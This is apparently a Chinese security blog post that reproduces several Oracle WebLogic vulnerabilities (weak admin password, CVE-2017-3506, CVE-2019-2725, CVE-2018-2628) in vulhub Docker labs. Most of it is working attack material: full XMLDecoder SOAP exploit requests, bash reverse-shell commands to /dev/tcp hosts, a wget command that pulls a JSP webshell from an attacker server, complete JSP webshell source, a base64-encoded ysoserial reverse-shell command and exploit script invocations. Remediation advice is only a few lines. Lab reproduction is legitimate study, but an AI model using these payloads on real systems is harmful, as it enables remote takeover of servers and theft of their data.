#  中间件安全|WebLogic漏洞汇总   
原创 Cyb3rES3  Cyb3rES3c   2024-11-09 13:02  
  
**0x0****声明**  
  
    由于传播、利用此文所提供的信息而造成的任何直接或间接的后果和损失，均由使用者本人承担，Cyb3rES3c及文章作者不承担任何责任。如有侵权烦请告知，我们将立即删除相关内容并致歉。请遵守《中华人民共和国个人信息保护法》、《中华人民共和国网络安全法》等相关法律法规。  
  
**0x****1 前言**  
  
漏洞复现使用的是Linux+Docker容器，靶场是vulhub。  
  
  
**0x2 WebLogic概述**  
  
  
    WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，默认端口:7001，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。  
  
  
**0x3****后台弱口令 GetShell**  
  
**漏洞描述**  
  
    WebLogic 系统存在弱口令漏洞，通过弱口令进入后台。在后台的部署处存在上传文件的功能点，利用该功能点上传 war 包可 getshell。  
  
  
**影响范围**  
```
WebLogic 全版本（后台管理系统存在弱口令的前提下）
```  
  
**环境搭建**  
```
cd vulhub/weblogic/weak_password
docker-compose up -d
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEBbcZrrnP71s36ibpJWaHhichCbLNxYNwbh0040qbibeM6XV25WqZLKBfQ/640?wx_fmt=png&from=appmsg "")  
  
访问下面的URL  
```
http://<IP/DomainName>:7001/console/login/LoginForm.jsp
```  
  
出现下面的登录页面就说明环境搭建成功了  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVE6NoYufFOb8ibUzVmZS8Wkktbv1Xh4azc7M6zjxOkwl5OdvFdDzHRPdg/640?wx_fmt=png&from=appmsg "")  
  
**漏洞复现**  
  
WebLogic 默认账号/密码：  
```
weblogic/Oracle@123
```  
  
注：单个账号的密码出入错误次数超过 5 次就会自动锁定。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEQehgQkLThQShnERnRVEQMpMA032LbXf0WZv8kJUNUrKNS1TzztZ3Lw/640?wx_fmt=png&from=appmsg "")  
  
在后台管理的部署->安装服务中有一个可以上传文件功能点  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVE8p034wTTg4zEdg6oMjmIrt07wwPtTdNWG7icj5pYQNibhCuRAdQkMB0Q/640?wx_fmt=png&from=appmsg "")  
  
将 JSP 木马压缩为 zip 文件  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEP2xwpCbpp2x1NJ55AkVK0tLeVXxHRzysIfqBAHzzfLwAnWOjJNcaEA/640?wx_fmt=png&from=appmsg "")  
  
将压缩后的zip文件后缀名修改为.war  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVE47dXq5zF64fjCEcNFEEhVsnj3hmDvpibMyfSHTqxOe8WqMB7h0oKm7w/640?wx_fmt=png&from=appmsg "")  
  
上传WebShell  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEIkgF2Zia6BFcu6RdfLhETgXBclyh9Bbe5VnahYcPI6GHrOacePDPRibQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEQ4gEZbW9v2LdnuCuAfdxIpXotGnEML9Jl1JmY5SdDFnzJnkC1qhojw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEIJtZ8fEyPhTtibdwxN0oxDlpLlibprkB4zj0g6CJialJKXcINic0ucfibQQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEXKUQ6pRzibibSG1FsfjaOl5aaBBzPX5HiaKgDJdE5dj04cfdOibKp49Pug/640?wx_fmt=png&from=appmsg "")  
  
点击“下一步”  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEE5UGWT2icWbukkondxmpB5hTDI8XibQBrqYQ7iakXFWRqUIndsmuhqVsQ/640?wx_fmt=png&from=appmsg "")  
  
点击“下一步”  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEQOEnXngxDicb8bbTicKMDYb4SjvIeu6JynG7fnXqno0rV2GpSbXXJIug/640?wx_fmt=png&from=appmsg "")  
  
点击“完成”  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEUMOeA1BqVMtBtuUJm6ibvzTCfDCPgqA1E1DFsDg3ibFBOof7CtoIiazww/640?wx_fmt=png&from=appmsg "")  
  
这个时候就会发现多了一个名称为 shell 的 Web 应用程序  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVE6B0ochAabeooRVFMZEZ91MeiaZRTeicibT0ABvql93Hm5pkAbA5jAYnNg/640?wx_fmt=png&from=appmsg "")  
  
到这里 WebShell 就上传成功了  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVE05gAibnZibh6Po9FlDcWlcZk6Rqia6ZJWtvib1hLdWDfpFuxw8BDkOxJyw/640?wx_fmt=png&from=appmsg "")  
  
**修复建议**  
```
将弱密码修改为强密码
```  
  
  
**0x4****CVE-2017-3506**  
  
**漏洞描述**  
  
    WebLogic 的 WLS Security 组件对外提供的 WebServer 服务，其中使用了 XMLDecoder 来解析用户输入的 XML 数据，在解析的过程中存在反序列化漏洞，可导致任意命令执行。  
  
  
**影响范围**  
```
WebLogic 10.3.6.0
WebLogic 12.1.3.0
WebLogic 12.2.1.1
WebLogic 12.2.1.2
```  
  
**环境搭建**  
```
vulhub/weblogic/weak_password
docker-compose up -d
```  
  
**漏洞复现**  
  
漏洞验证路径：  
```
/wls-wsat/CoordinatorPortType
/wls-wsat/RegistrationPortTypeRPC
/wls-wsat/ParticipantPortType
/wls-wsat/RegistrationRequesterPortType
/wls-wsat/CoordinatorPortType11
/wls-wsat/RegistrationPortTypeRPC11
/wls-wsat/ParticipantPortType11
/wls-wsat/RegistrationRequesterPortType11
```  
  
响应结果若如下图所示（注：不同路径的响应结果有细微差别），则存在 wls_wsat 组件  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEtPVKMsGGX1ibMUhbSCmexOv0FmK1qtib0a6aCmKq7yUicWAicqvEQQenaQ/640?wx_fmt=png&from=appmsg "")  
  
利用方式1：浏览器页面打印字符串  
  
HTTP请求报文如下  
```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.111.128:7001
Accept-Encoding: gzip, deflate
Accept: */*Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 643

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>   
  <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
  <java><java version="1.4.0" class="java.beans.XMLDecoder"> 
  <object class="java.io.PrintWriter">   
  <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/1.jsp</string> 
  <void method="println">
<string>  
  <![CDATA[
<% out.print("Successfully!"); %>
  ]]> 
  </string>  
  </void>   
  <void method="close"/>   
  </object></java></java>  
  </work:WorkContext>   
  </soapenv:Header>   
  <soapenv:Body/>
</soapenv:Envelope>
```  
  
发送HTTP请求报文  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVE3Hsj2t76Fibm7ZtUKUTyzfP4Hl8jUg1qrzWCgyiccU37478BruoSYPqw/640?wx_fmt=png&from=appmsg "")  
  
第一个 string 标签中的内容是 WebShell 的路径，第二个 string 标签的内容是 XML 文档的内容  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVE1Xu2SBFqYEqoN4pWQFYFvJGpPOgMTg8yxibFHiaBp3uxPZMcEqeKocQQ/640?wx_fmt=png&from=appmsg "")  
  
访问上传的脚本，访问路径是 项目名+文件名  
  
  
利用方式2：反弹Shell  
  
先利用nc监听端口  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEAC2pv3IbTPUhcYzXZsLlmpgYRWuEk3aU6dqC7X4ibL932JlgT2tlqaw/640?wx_fmt=png&from=appmsg "")  
  
HTTP请求报文  
```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.111.128:7001
Accept-Encoding: gzip, deflate
Accept: */*Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 640

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/172.22.32.165/6666 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>

```  
  
发送HTTP报文  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEC921759LNwDkicE8wvr9T2JRMRdrnfhA8fmibMX8E2bdXfhdOjZSYxJQ/640?wx_fmt=png&from=appmsg "")  
  
成功接收到反弹Shell，如下图所示  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEW3hrtylRR0Ez3aibnnc7pogTYgjgWIGqRHJ9SJOWHPwRQqGV4scMFZA/640?wx_fmt=png&from=appmsg "")  
  
利用方式3 上传WebShell  
  
HTTP请求报文  
```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.111.128:7001
Accept-Encoding: gzip, deflate
Accept: */*Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 1565

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>   
  <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
  <java><java version="1.4.0" class="java.beans.XMLDecoder"> 
  <object class="java.io.PrintWriter">   
  <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/shell.jsp</string> 
  <void method="println">
<string>
  <![CDATA[
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
 
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("cmd");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>
  ]]> 
  </string>  
  </void>   
  <void method="close"/>   
  </object></java></java>  
  </work:WorkContext>   
  </soapenv:Header>   
  <soapenv:Body/>
</soapenv:Envelope>
```  
  
发送HTTP请求报文  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVED3XxOEnDMGeo7ibItRxBp8kTl9yjq61u6c49Iiac9L09sacYyxsKRZRA/640?wx_fmt=png&from=appmsg "")  
  
访问WebShell  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEyp6zPODkzuvYsibXP5ng45nDy8TaQH1AaDMibAUTst4gsFggiaGcNlMeg/640?wx_fmt=png&from=appmsg "")  
  
蚁剑连接WebShell  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEeAzv9kbTVl8aMic1iamJIGgQKMEoKzMibcDR2Y6kYibQvImia4wBr9PKP5w/640?wx_fmt=png&from=appmsg "")  
  
也可以将WebShell修改为HTTP响应式的WebShell  
```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.111.128:7001
Accept-Encoding: gzip, deflate
Accept: */*Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 812

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>   
  <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
  <java><java version="1.4.0" class="java.beans.XMLDecoder"> 
  <object class="java.io.PrintWriter">   
  <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/shell.jsp</string> 
  <void method="println">
<string>
  <![CDATA[
<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048];  while((a=in.read(b))!=-1){ out.println(new String(b)); } %>
  ]]> 
  </string>  
  </void>   
  <void method="close"/>   
  </object></java></java>  
  </work:WorkContext>   
  </soapenv:Header>   
  <soapenv:Body/>
</soapenv:Envelope>
```  
  
上传WebShell  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEJwE3uhveAicY1NlrjKAbCVwoPPTqYY7W2spRVBt630vstqvjxWVDjZQ/640?wx_fmt=png&from=appmsg "")  
  
利用WebShell执行命令  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEVuB5da60uPdibSpyjDqaSEJ06TtS20BpKtoCxib1nfE6cx0Yjp1r1jgA/640?wx_fmt=png&from=appmsg "")  
  
利用方式4 工具  
  
也可以选择利用工具直接上传 WebShell  
  
要先用工具检查是否存在漏洞之后才能上传文件  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEFkLF9DywuCIDiaibHXLcaSgfatqYXpYTRZZGibmjSAdhR0I1E7QBZo1LQ/640?wx_fmt=png&from=appmsg "")  
  
存在漏洞，上传WebShell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEoFquu3bAn24CO2Uwd5pNMxJudibxTTnbaj4aWxakB5XI5fUld6qeiaRQ/640?wx_fmt=png&from=appmsg "")  
  
蚁剑连接WebShell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVE4wIh0ZSE5aIs0YTphGeAnzib6hIdw3c81J5rY0bQkkJtvGNLaQRrC9g/640?wx_fmt=png&from=appmsg "")  
  
**修复建议**  
```
更新到最近版本，打上补丁，对 wls-wsat 的资源进行访问控制。
```  
  
  
**0x5****CVE-2019-2725**  
  
**漏洞描述**  
  
    wls9-async等组件为WebLogic Server提供异步通讯服务，默认应用于WebLogic部分版本。由于该WAR包在反序列化处理输入信息时存在缺陷，攻击者通过发送精心构造的恶意 HTTP 请求，即可获得目标服务器的权限，在未授权的情况下远程执行命令。  
这个漏  
洞依旧是根据 WebLogic 的 XMLdecoder 反序列化漏洞。  
  
**影响范围**  
```
Oracle WebLogic Server 10.*
Oracle WebLogic Server 12.1.3

影响组件：
bea_wls9_async_response.war
wsat.war
```  
  
**环境搭建**  
```
cd vulhub/weblogic/weak_password
docker-compose up -d
```  
  
**漏洞复现**  
  
访问 /_async/AsyncResponseService路径，出现下面这个页面就说明存在漏洞  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEnDuDLyLq3Rt1T2akUa1mc0M4nF5ZIicOfj29cagyd4TrkzMiaMnrs6Gw/640?wx_fmt=png&from=appmsg "")  
  
利用方式1 反弹Shell  
  
  
HTTP请求报文如下  
```
POST /_async/AsyncResponseService HTTP/1.1
Host: 192.168.111.128:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Length: 789
Accept-Encoding: gzip, deflate
SOAPAction:
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"
xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/192.168.235.9/7777 0&gt;&amp;1
</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>

```  
  
开启端口监听  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEA1TVAgOrmpz8hWAWekSfmUCRNrcibn56wa7hibc7iaz7czRQS3P6erRqw/640?wx_fmt=png&from=appmsg "")  
  
发送反弹Shell的HTTP请求报文  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEhOo2GVgXr2S43KK9fva5hFiaI2aCbnZE7UoC6pLyHQoEamwykBW7tdQ/640?wx_fmt=png&from=appmsg "")  
  
成功接收到反弹Shell  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVE1GaZk5zRia70o2roDO6UibUxx1MRdG8ed4bzFibNeqrsfvZTfsYqfuklw/640?wx_fmt=png&from=appmsg "")  
  
  
利用方式2 上传WebShell  
  
WebShell 可放置在两个路径下，分别是  
```
路径一：bea_wls9_async_response/8tpkys/war
访问路径：http://<IP/DomainName>:7001/_async/shell.jsp
路径二：bea_wls_internal/9j4dqk/war
访问路径：http://<IP/DomainName>:7001/bea_wls_internal/shell.jsp
```  
  
需要在VPS上开启Web Server，这里直接在本地开启Web Server即可，并在WWW目录下放置一个JSP WebShell以供靶机下载  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEdptLiab5Itf1zT5iaPKp6AOrKQc4dGOgQLXOmJh3ScAxCmkbVWkKicx3A/640?wx_fmt=png&from=appmsg "")  
```
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
 
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("cmd");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>
```  
  
重新访问   
/_async/AsyncResponseService 路径，利用BurpSuite抓包，构造Payload  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEeky06cmibtkOvJsicaAecfNQTacNtPZ5hnOae3x5PjH4Z4rVvpz7vEibQ/640?wx_fmt=png&from=appmsg "")  
```
POST /_async/AsyncResponseService HTTP/1.1
Host: 192.168.111.128:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Length: 838
Accept-Encoding: gzip, deflate
SOAPAction:
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"
xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>wget http://192.168.235.9/JspWebShell.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/cmd.jsp
</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header><soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```  
  
发送HTTP报文  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEqMYj1Hpk6nBhYq5RDJlb1mS2bCnIcMqy7a37rp8VW1sI4RBeRLTsSw/640?wx_fmt=png&from=appmsg "")  
  
WebShell上传成功，访问路径如下  
```
http://<IP/DomainName>:7001/bea_wls_internal/cmd.jsp
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEfiafSGmdQicw0EVBiako7L4pdta5bcsH5neEOLRRkibKvhibmZBibkAOHlnA/640?wx_fmt=png&from=appmsg "")  
  
**修复建议**  
```
禁用 bea_wls9_async_response 组件。
删除 wls9_async_response 的 war 包并重启。
禁止访问/_async/* 路径。
```  
  
  
**0x6****CVE-2018-2628**  
  
**漏洞描述**  
  
    WebLogic Server中的RMI 通信使⽤T3协议在WebLogic Server和其它Java程序（客户端或者其它 WebLogic Server实例）之间传输数据, 服务器实例会跟踪连接到应⽤程序的每个Java虚拟机（JVM）中, 并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端⼝的应⽤上默认开 启， 攻击者可以通过T3协议发送恶意的的反序列化数据, 进⾏反序列化, 实现对存在漏洞的WebLogic组件 的远程代码执⾏攻击。  
  
  
**影响范围**  
```
WebLogic 10.3.6.0
WebLogic 12.1.3.0
WebLogic 12.2.1.2
WebLogic 12.2.1.3
```  
  
**环境搭建**  
```
cd vulhub/weblogic/CVE-2018-2628  
docker-compose up -d
```  
  
**漏洞复现**  
  
访问环境后响应状态码是 404  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVETGKibOJQWxdp8jZHCeIXCHTfCLch7KTazmibTvpNu4kIM0oBu0Ub3JeQ/640?wx_fmt=png&from=appmsg "")  
  
使用 nmap 扫描发现 T3 协议  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVETic6ekzUYqRKNCqicOccddkwSaXdVXYxBpL74gxN3f8EdMbyzv1d6Wyw/640?wx_fmt=png&from=appmsg "")  
  
利用DNSLog检查漏洞是否存在  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEbKRzxZXibiaTJQ4q28icib4wmj4XsaCgtkKyT2nzEghic1BxXib1icd6tUxog/640?wx_fmt=png&from=appmsg "")  
  
根据DNSLog响应结果可以判断漏洞存在  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEoaF5xfiaiaTOyTkhHaic27O4yVbSzoZdvYKTvVicKIgUzBVIdVuE9RA0mQ/640?wx_fmt=png&from=appmsg "")  
  
利用方式1 反弹Shell  
  
利用 ysoserial 开启一个 JRMP Server  
```
java -cp ysoserial.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]
其中 [command] 是要执行的命令，[listen port] 是 JRMP Server 监听的端口。
```  
  
ysoserial 不允许出现 &符号，需要利用Base64编码构造反弹 shell  
```
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections1 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzNS45Lzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}'
```  
  
Base64编码的内容如下图所示  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVER91DyP3jEznVJoUibw830S3aaibVFPaawl9MTeP39jqQepA6FY6Eia5kQ/640?wx_fmt=png&from=appmsg "")  
  
注：在 Windows 中需要使用 PowerShell 来执行，否则 base64 命令会报错。  
  
EXP 脚本下载地址：https://www.exploit-db.com/exploits/44553  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEd0O9iaU0JF2ibJbycmVnGkMNhEuY9kLxjx4UbNiaCWRTzLk4AUia2UicdLA/640?wx_fmt=png&from=appmsg "")  
```
python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]
其中 [victim ip] 和 [victim port] 分别是靶机 IP 和端口，[JRMPListener ip] 和[JRMPListener port] 分别是 JRMP 服务器的 IP 和端口，[JRMPClient] 是执行 JRMPClient 的类，可选的值有 JRMPClient 或 JRMPClient2。
```  
  
执行EXP（需要Python2的环境，这里使用Python2.7）  
```
F:\Env\Python_2_7\python.exe 44553.py 192.168.111.128 7001 F:\SecTools\ysoserial\ysoserial.jar 192.168.235.9 6666 JRMPClient
```  
  
先启动 JRMP Server  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEtgBCupd4FGMuY1vLUmvP3wz0icjvgUSEgrdVrDRrVYShlialnocar82Q/640?wx_fmt=png&from=appmsg "")  
  
然后开启监听 nc，最后启动 JRMP Client  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVED9E67hNsXh5f7scbicTFh9NkCibZRGoecjYK1VLtxqELzyvoYvXZJ7Nw/640?wx_fmt=png&from=appmsg "")  
  
成功接收到反弹Shell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEC2sej6DMnQGz2Vcm5jIeLSQib1NXGg5P8M4QYqL219iaRx7dnzhqic28w/640?wx_fmt=png&from=appmsg "")  
  
  
利用方式2 RCE  
  
脚本地址  
```
https://github.com/jas502n/CVE-2018-2628
```  
  
需要Python2环境运行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEMcEF1LzjBm6gibUwUwibOic0vezXib8TCyj9XiaXc2ymPfeSoQRadZ9QkqQ/640?wx_fmt=png&from=appmsg "")  
  
  
运行脚本后会生成一个HTTP访问链接，复制链接在浏览器中访问  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEtnEagkSsctfBIvUrY4ibRwGfibCMxQq7nmOGBBd9SObb8oKCHGLWibeMQ/640?wx_fmt=png&from=appmsg "")  
  
每执行一次命令都需要重新运行一次脚本，要对执行的命令进行 Base64 编码。  
  
  
